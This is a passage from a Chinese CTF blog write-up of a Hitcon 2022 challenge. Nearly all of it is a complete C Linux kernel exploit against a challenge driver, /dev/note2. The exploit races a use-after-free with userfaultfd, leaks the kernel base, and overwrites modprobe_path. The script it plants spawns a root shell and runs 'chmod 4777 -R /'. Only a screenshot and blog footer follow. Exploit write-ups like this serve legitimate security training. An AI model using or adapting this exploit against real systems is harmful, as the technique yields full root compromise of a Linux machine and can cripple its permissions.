class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> uLL;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">size_t</span> koffset = <span class="hljs-number">0</span>, kleak = <span class="hljs-number">0</span>, kbase = <span class="hljs-number">0xffffffff81000000</span>, kheap = <span class="hljs-number">0xffff888000000000</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>, pop_rdi_ret = <span class="hljs-literal">NULL</span>, init_cred = <span class="hljs-literal">NULL</span>, swapgs_restore_regs_and_return_to_usermode = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> kfd = <span class="hljs-number">-1</span>, fault_cnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i += <span class="hljs-number">8</span>)<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i, *(uLL *)(buf + i));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">fatal</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1m[x] Error at: %s\e[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> idx;<br>    <span class="hljs-type">uint64_t</span> size;<br>    <span class="hljs-type">uint64_t</span> buf;<br>&#125; Note;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .size = size,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF00</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF03</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF01</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteShow</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF02</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *buf;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); <span class="hljs-comment">// Create UserFaultFd</span><br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        fatal(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>) <span class="hljs-comment">// Register UserFaultFd</span><br>        fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd); <span class="hljs-comment">// Run Handler</span><br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        fatal(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br>fault_handler_thread(<span class="hljs-type">void</span> *arg)<br>&#123;<br>    page_size = sysconf(_SC_PAGESIZE);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br>    uffd = (<span class="hljs-type">long</span>)arg;<br><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br><br><span class="hljs-keyword">while</span> (poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg)) &lt;= <span class="hljs-number">0</span>) fatal(<span class="hljs-string">&quot;read(uffd)&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %02llx Start!\e[0m\n&quot;</span>, fault_cnt);<br>        <br>        <span class="hljs-keyword">switch</span> (fault_cnt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @brief kfree(0x18) (node-&gt;data)  !!Affected by UserFaultfd Now!!</span><br><span class="hljs-comment">             *        kfree(0x18) (struct node)</span><br><span class="hljs-comment">             */</span><br>            noteDel(<span class="hljs-number">0</span>);<br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 0 [*] Consume the 0x18 chunk (struct node)</span><br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 1 [*] Get the 0x18 chunk (node-&gt;data) as our new node struct so we can overwrite it</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @brief kfree(0x18) (node-&gt;data)  !!Affected by UserFaultfd Now!!</span><br><span class="hljs-comment">             *        kfree(0x18) (struct node)</span><br><span class="hljs-comment">             */</span><br>            noteDel(<span class="hljs-number">2</span>);<br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 2 [*] Consume the 0x18 chunk (struct node)</span><br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 3 [*] Get the 0x18 chunk (node-&gt;data) as our new node struct so we can overwrite it</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            fatal(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)page; <span class="hljs-comment">// Addr to copy from</span><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp;<br>                          ~(page_size - <span class="hljs-number">1</span>); <span class="hljs-comment">// Addr to copy to</span><br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] uffdio_copy.src = 0x%016lx\e[0m\n&quot;</span>, uffdio_copy.src);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] uffdio_copy.dst = 0x%016lx\e[0m\n&quot;</span>, uffdio_copy.dst);<br><br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>) <span class="hljs-comment">// Back to copy_from_user</span><br>            fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %02llx Done!\e[0m\n&quot;</span>, fault_cnt);<br>        fault_cnt++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[*] Status saved.\e[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evilEdit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[+] fault_page = 0x%016lx\e[0m\n&quot;</span>,buf + <span class="hljs-number">0x1000</span>*fault_cnt);<br>    noteEdit((<span class="hljs-type">int</span>)args, buf + <span class="hljs-number">0x1000</span>*fault_cnt);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1m[x] What happened? \e[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] Enjoy your shell...\e[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack_modprobe</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-comment">// 0x752f706d742f</span><br>	system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\nsetsid cttyhack setuidgid 0 /bin/sh\nchmod 4777 -R /\n&#x27; &gt; /tmp/u&quot;</span>);<br>	system(<span class="hljs-string">&quot;chmod +x /tmp/u&quot;</span>);<br>	system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/nightu&quot;</span>);<br>	system(<span class="hljs-string">&quot;chmod +x /tmp/nightu&quot;</span>);<br>	system(<span class="hljs-string">&quot;/tmp/nightu&quot;</span>);<br>	system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>    <span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>, <span class="hljs-type">hijack_t</span>;<br>    <span class="hljs-type">size_t</span> rand_key, leak_addr;<br>    CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">cpu_set_t</span>), &amp;pwn_cpu))<br>        fatal(<span class="hljs-string">&quot;sched_setaffinity&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[*] Wish you every shell...\e[0m\n&quot;</span>);<br>    saveStatus();<br><br>    kfd = open(<span class="hljs-string">&quot;/dev/note2&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kfd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        fatal(<span class="hljs-string">&quot;\e[31m\e[1m[x] Fuck DEV \e[0m\n&quot;</span>);<br>    &#125;<br><br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(buf, <span class="hljs-number">0x4000</span>, fault_handler_thread);<br><br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-type">size_t</span> *fake_node = (<span class="hljs-type">size_t</span> *)page;<br>    <span class="hljs-comment">// [*] Though we set key = 0, the addr&#x27;s data was encrypted before we change the key</span><br>    fake_node[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    fake_node[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>;<br>    fake_node[<span class="hljs-number">2</span>] = <span class="hljs-number">0xfffffe0000000000</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief The first time, we try to hijack a node struct to AAR.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     */</span><br><br>    noteAdd(<span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 0</span><br>    pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span> *)<span class="hljs-number">0</span>);<br>    usleep(<span class="hljs-number">300000</span>);<br><br>    noteShow(<span class="hljs-number">1</span>, page);<br>    Hexdump(page, <span class="hljs-number">0x100</span>);<br>    rand_key = (*(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x8</span>)) ^ (<span class="hljs-number">0x00000000ffffffff</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">8</span>) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x10</span>) ^= rand_key;<br>    leak_addr = *(<span class="hljs-type">size_t</span> *)(page);<br>    kbase = (*(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x4</span>)) - <span class="hljs-number">0xa08e00</span>;<br>    <span class="hljs-type">size_t</span> modprobe_path = kbase + <span class="hljs-number">0x1654b20</span>;<br>    Hexdump(page, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, rand_key);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] leak_addr = 0x%016lx\e[0m\n&quot;</span>, leak_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] kbase = 0x%016lx\e[0m\n&quot;</span>, kbase);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] modprobe_path = 0x%016lx\e[0m\n&quot;</span>, modprobe_path);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief The second time, we try to hijack a node struct to AAW.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     */</span><br>    fake_node[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    fake_node[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>;<br>    fake_node[<span class="hljs-number">2</span>] = modprobe_path;<br>    noteAdd(<span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 2</span><br>    pthread_create(&amp;<span class="hljs-type">hijack_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span> *)<span class="hljs-number">2</span>);<br>    usleep(<span class="hljs-number">300000</span>);<br><br>    noteShow(<span class="hljs-number">3</span>, page);<br>    Hexdump(page, <span class="hljs-number">0x100</span>);<br>    rand_key = (*(<span class="hljs-type">size_t</span> *)(page)) ^ (<span class="hljs-number">0x6f6d2f6e6962732f</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, rand_key);<br>    <span class="hljs-built_in">strcpy</span>(page,<span class="hljs-string">&quot;/tmp/u&quot;</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page+<span class="hljs-number">8</span>) ^= rand_key;<br>    noteEdit(<span class="hljs-number">3</span>, page);<br><br>    hijack_modprobe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211301714001.png" srcset="/img/loading.gif" lazyload alt="image-20221130171423180"></p>
+<p>后面再补.jpg</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hitcon2022 部分题解</div>
+      <div>http://n1ghtu.github.io/posts/a60d8e49.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Nightu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/3573e2f.html" title="RCTF 2022 Pwn bfc&amp;picStore">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">RCTF 2022 Pwn bfc&amp;picStore</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/dc72b55e.html" title="pwn.college 学习记录">
+                        <span class="hidden-mobile">pwn.college 学习记录</span>
+                        <span class="visible-mobile">下一篇</span>
